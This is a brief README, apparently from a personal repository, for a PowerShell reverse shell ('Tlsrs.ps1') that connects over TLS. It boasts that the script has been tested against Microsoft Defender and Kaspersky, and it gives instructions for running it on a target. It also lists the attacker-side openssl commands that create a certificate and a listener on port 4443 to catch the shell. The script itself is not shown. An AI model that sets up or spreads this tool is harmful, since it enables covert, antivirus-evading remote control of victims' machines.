# Powershell Scripts by me ;)
#####################################################################################

Tlsrs.ps1 : This is a PowerShell ReverseShell that uses TLS to establish a TCP connection.
By now, this script has been tested on Microsoft Defender and Kaspersky ;)
On Target:
just change the IP and Port and run it in Powershell

On Kali:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4443

######################################################################################



